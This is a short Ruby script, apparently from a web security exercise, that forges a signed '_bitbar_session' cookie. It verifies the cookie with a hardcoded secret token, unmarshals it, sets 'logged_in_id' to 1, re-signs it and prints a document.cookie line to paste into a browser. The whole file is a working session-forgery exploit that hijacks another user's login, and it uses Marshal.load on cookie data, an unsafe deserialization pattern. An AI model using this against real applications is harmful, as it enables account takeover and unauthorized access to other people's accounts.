require 'openssl'
require 'cgi'
require 'base64'

if ARGV.length < 1
        puts "too few arguments"
        exit
end

cookie = CGI::unescape(ARGV[0])

data, digest = cookie.split('--')
secret_token = "0a5bfbbb62856b9781baa6160ecfd00b359d3ee3752384c2f47ceb45eada62f24ee1cbb6e7b0ae3095f70b0a302a2d2ba9aadf7bc686a49c8bac27464f9acb08"
raise 'invalid message' unless digest == OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, secret_token, data)
message = Base64.strict_decode64(data)
cookie_dict =  Marshal.load(message)
cookie_dict["logged_in_id"] = 1
message = Base64.strict_encode64(Marshal.dump(cookie_dict))
digest_new = OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, secret_token, message)
cookie_new = message + '--' + digest_new
puts "document.cookie=\"_bitbar_session=#{cookie_new}\""
